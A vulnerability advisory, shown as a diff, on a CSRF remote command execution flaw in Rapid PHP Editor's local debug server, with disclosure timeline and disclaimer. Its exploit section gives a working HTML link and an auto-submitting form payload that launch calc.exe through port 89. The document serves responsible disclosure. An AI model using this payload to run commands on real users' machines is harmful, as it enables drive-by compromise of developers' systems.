@@ -1,0 +1,89 @@
+[+] Credits: John Page aka hyp3rlinx	
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/RAPID-PHP-EDITOR-REMOTE-CMD-EXEC.txt
+
+[+] ISR: Apparition Security
+
+
+
+Vendor:
+======================
+www.rapidphpeditor.com
+
+
+
+Product:
+===============================
+Rapid PHP Editor IDE
+rapidphp2016.exe v14.1
+
+
+Rapid PHP editor is a faster and more powerful PHP editor for Windows combining features of a fully-packed PHP IDE with 
+the speed of the Notepad. Rapid PHP is the most complete all-in-one software for coding PHP, HTML, CSS, JavaScript and
+other web development languages with tools for debugging, validating, reusing, navigating and formatting your code.
+
+
+
+Vulnerability Type:
+=============================
+CSRF Remote Command Execution
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+There is a Remote Command Execution ailment in this IDE, if a user of this IDE is running the internal debug server
+listening on localhost port 89 and they open a link or visit a malicious webpage then remote attackers can execute arbitrary
+commands on the victims system.
+
+Reference:
+http://forums.blumentals.net/viewtopic.php?f=15&t=7062
+
+
+Exploit code(s):
+================
+
+Call Windows "calc.exe" as POC
+
+<a href="http://127.0.0.1:89/~C/Windows/system32/calc.exe">Click it!</a>
+
+OR
+
+<form action="http://127.0.0.1:89/~C/Windows/system32/calc.exe" method="post">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+Disclosure Timeline:
+=============================================
+Vendor notification:  October 5, 2016
+Vendor confirms vulnerability: October 7, 2016
+Vendor releases fixed version: November 1, 2016
+November 2, 2016 : Public Disclosure
+
+
+
+
+Severity Level:
+================
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
